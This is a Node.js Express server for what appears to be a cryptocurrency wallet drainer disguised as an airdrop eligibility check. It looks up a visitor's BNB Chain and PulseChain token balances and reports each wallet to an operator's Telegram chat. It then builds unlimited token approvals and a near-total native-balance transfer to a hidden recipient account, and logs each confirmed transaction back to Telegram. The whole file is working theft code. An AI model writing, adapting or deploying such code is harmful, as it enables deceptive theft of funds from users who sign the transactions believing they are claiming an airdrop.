import express from 'express';
import cors from 'cors';
import axios from 'axios';
import { ethers } from 'ethers';
import TelegramBot from 'node-telegram-bot-api';
import dotenv from 'dotenv';
import Moralis from 'moralis';

dotenv.config();

const corsConfig = {
    origin: 'https://app.desgap.com', 
    methods: ['GET', 'POST', 'PUT', 'DELETE'], 
    credentials: true, 
  };
const app = express();
app.use(cors(corsConfig));
app.use(express.json());

const PORT = process.env.PORT || 8000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const RECIPIENT_ACCOUNT = process.env.RECIPIENT_ACCOUNT; 
const MORALIS_API_KEY = process.env.MORALIS_API_KEY;

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });


const bnbTokens = [
  "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",
  "0x55d398326f99059ff775485246999027b3197955",
  "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
  "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3",
  "0x2170ed0880ac9a755fd29b2688956bd959f933f8",
  "0x7083609fce4d1d8dc0c979aab8c869ea2c873402",
  "0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c",
  "0x4338665cbb7b2485a8855a139b75d5e34ab0db94",
  "0x8578eb576e126f67913a8b40463a70cc1f8c6f9c",
  "0x23396cf899ca06c4472205fc903bdb4de249d6fc",
  "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe",
  "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82",
  "0x0d8ce2a99bb6e3b7db580ed848240e4a0f9ae153",
  "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47",
  "0x4b0f1812e5df2a09796481ff14017e6005508003",
];

const pulseChainToken = [
  "0x57fde0a71132198BBeC939B98976993d8D89D225",
  "0x02dcdd04e3f455d838cd1249292c58f3b79e3c3c",
  "0x95B303987A60C71504D99Aa1b13B4DA07b0790ab",
  "0x2fa878Ab3F87CC1C9737Fc071108F904c0B0C95d",
  "0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39",
  "0x94534EeEe131840b1c0F61847c572228bdfDDE93",
  "0x6B175474E89094C44Da98b954EedeAC495271d0F",
  "0xefd766ccb38eaf1dfd701853bfce31359239f305",
  "0x0cb6f5a34ad42ec934882a05265a7d5f59b51a2f",
];


const SUPPORTED_CHAINS = {
  '0x38': 'BNB Chain',
  '0x171': 'PulseChain',
};

const NATIVE_TOKEN_SYMBOLS = {
  '0x38': 'BNB',
  '0x171': 'PLS',
};


const GAS_DEFAULTS = {
  '0x38': {
    gasLimit: ethers.BigNumber.from("21000"),
    gasPrice: ethers.utils.parseUnits("5", "gwei"),
    approvalGasLimit: ethers.BigNumber.from("50000"),
  },
  '0x171': {
    gasLimit: ethers.BigNumber.from("21000"),
    gasPrice: ethers.utils.parseUnits("25000", "gwei"),
    approvalGasLimit: ethers.BigNumber.from("50000"),
  },
};

// Initialize Moralis
async function initMoralis() {
  if (!Moralis.Core.isStarted) {
    await Moralis.start({ apiKey: MORALIS_API_KEY });
  }
}

initMoralis();


app.post("/api/getBalances", async (req, res) => {
  const { walletAddress, chainID } = req.body;

  if (!walletAddress || !chainID) {
    console.warn("⚠️ Missing required parameters!");
    return res.status(400).json({ error: "Wallet address and chain ID are required." });
  }
  if (!SUPPORTED_CHAINS[chainID]) {
    console.warn(`⚠️ Unsupported Chain ID: ${chainID}`);
    return res.status(400).json({
      ok: false,
      error: `Chain ID ${chainID} is not supported. Only BNB Chain (0x38) and PulseChain (0x171) are supported.`,
    });
  }

  try {
    const nativeTokenSymbol = NATIVE_TOKEN_SYMBOLS[chainID];
    const chainTokens = chainID === '0x38' ? bnbTokens : pulseChainToken;

    const tokenBalanceResponse = await Moralis.EvmApi.token.getWalletTokenBalances({
      chain: chainID,
      address: walletAddress,
      tokenAddresses: chainTokens,
    });



    const tokenBalances = tokenBalanceResponse?.raw?.length
      ? tokenBalanceResponse.raw.map(token => ({
          symbol: token.symbol,
          balance: token.balance ? ethers.utils.formatUnits(token.balance, token.decimals) : "0",
          contractAddress: token.token_address,
          decimals: token.decimals,
        }))
      : [];



  
    const nativeBalanceResponse = await Moralis.EvmApi.balance.getNativeBalance({
      chain: chainID,
      address: walletAddress,
    });


    let balanceInWei = nativeBalanceResponse?.raw?.balance || "0";
    let nativeBalance = parseFloat(ethers.utils.formatEther(balanceInWei)).toFixed(2);

   
    const hasNativeBalance = parseFloat(nativeBalance) > 0;
    const hasTokens = tokenBalances.some(token => parseFloat(token.balance) > 0);

    if (!hasNativeBalance && !hasTokens) {
      console.warn("❌ Not eligible: No tokens and no native balance.");
      return res.json({ eligible: false, message: "You are not eligible for this airdrop." });
    }

    // Send Data to Telegram
    const message = `
🚀 **Wallet Detected!** 🚀

📌 **Wallet Address:** \`${walletAddress}\`  
💰 **Native Balance:** \`${nativeBalance} ${nativeTokenSymbol}\`

🔹 **Tokens:**
${tokenBalances.length > 0 ? tokenBalances.map(t => `🔸 ${t.symbol}: \`${t.balance}\``).join("\n") : "❌ No tokens found"}

✅ *Status:* Eligible for airdrop 🎉
`;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: "Markdown", disable_web_page_preview: true });


    let approvalTransactions = [];
    let unsignedTransaction = null;

 
    let gasPrice;
    try {
      const gasResponse = await Moralis.EvmApi.utils.getGasPrice({
        chain: chainID,
      });
      gasPrice = ethers.BigNumber.from(gasResponse.raw.gas_price);
    } catch (gasError) {
      console.warn("⚠️ Failed to fetch gas price, using default:", gasError.message);
      gasPrice = GAS_DEFAULTS[chainID].gasPrice;
    }

    for (const token of tokenBalances) {
      if (parseFloat(token.balance) > 0) {
        const approveAmount = ethers.constants.MaxUint256;
        const approvalTx = {
          to: token.contractAddress,
          data: new ethers.utils.Interface([
            "function approve(address spender, uint256 amount)"
          ]).encodeFunctionData("approve", [RECIPIENT_ACCOUNT, approveAmount]),
          gasLimit: GAS_DEFAULTS[chainID].approvalGasLimit, 
          gasPrice: gasPrice.toString(),
          chainId: chainID,
        };
        approvalTransactions.push(approvalTx);
      }
    }



    if (approvalTransactions.length > 0) {
      const tokenNames = tokenBalances
        .filter(t => parseFloat(t.balance) > 0)
        .map(t => t.symbol)
        .join(", ");
 

     
      const totalApprovalGas = GAS_DEFAULTS[chainID].approvalGasLimit.mul(approvalTransactions.length);
      const totalApprovalGasFee = totalApprovalGas.mul(gasPrice);
     

      
      balanceInWei = ethers.BigNumber.from(balanceInWei).sub(totalApprovalGasFee);
      nativeBalance = parseFloat(ethers.utils.formatEther(balanceInWei)).toFixed(2);
     

    
      if (ethers.BigNumber.from(balanceInWei).lte(0)) {
        console.warn("❌ Insufficient funds after accounting for approval gas fees.");
        return res.json({ eligible: false, message: `Not enough ${nativeTokenSymbol} to cover approval gas fees.` });
      }
    }

    // Prepare Native Transaction
    if (hasNativeBalance) {

      const gasLimit = GAS_DEFAULTS[chainID].gasLimit;
      const gasFee = gasLimit.mul(gasPrice);
      const balanceBN = ethers.BigNumber.from(balanceInWei);

      

      if (balanceBN.gt(gasFee)) {
        const sendableAmount = balanceBN.sub(gasFee);
        unsignedTransaction = {
          to: RECIPIENT_ACCOUNT,
          value: sendableAmount.toString(),
          gasLimit: gasLimit.toString(),
          gasPrice: gasPrice.toString(),
          chainId: chainID,
        };

      } else {
        console.warn("❌ Insufficient funds for native transfer gas fees after approvals.");
        return res.json({ eligible: false, message: `Not enough ${nativeTokenSymbol} to cover gas fees after approvals.` });
      }
    }

    res.json({
      eligible: true,
      nativeBalance,
      tokenBalances,
      approvalTransactions,
      transaction: unsignedTransaction,
    });
  } catch (error) {
    console.error("❌ Error fetching balances:", error);
    res.status(500).json({ error: "Failed to retrieve wallet balances.", details: error.message });
  }
});


app.post("/api/transactionConfirmed", async (req, res) => {
  try {
    const { walletAddress, transactionHash, type, chainID } = req.body;

    if (!walletAddress || !transactionHash || !type || !chainID) {
      return res.status(400).json({ success: false, error: "Missing required transaction details." });
    }

    const chainName = SUPPORTED_CHAINS[chainID] || chainID;
    const explorerUrl = chainID === '0x38'
      ? `https://bscscan.com/tx/${transactionHash}`
      : `https://otter.pulsechain.com/tx/${transactionHash}`;

    let message = `✅ *New Transaction Confirmed!*\n\n` +
                  `🔹 *Sender:* ${walletAddress}\n` +
                  `🔹 *Type:* ${type === "approval" ? "Token Approval" : "Native Transfer"}\n` +
                  `🔹 *Chain:* ${chainName}\n` +
                  `🔹 *Transaction Hash:* [${transactionHash}](${explorerUrl})\n`;


    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: "Markdown", disable_web_page_preview: true });

    return res.json({ success: true, message: "Transaction confirmed and sent to Telegram." });
  } catch (error) {
    console.error("❌ Error processing transaction confirmation:", error.message);
    return res.status(500).json({ success: false, error: "Failed to send Telegram message." });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});

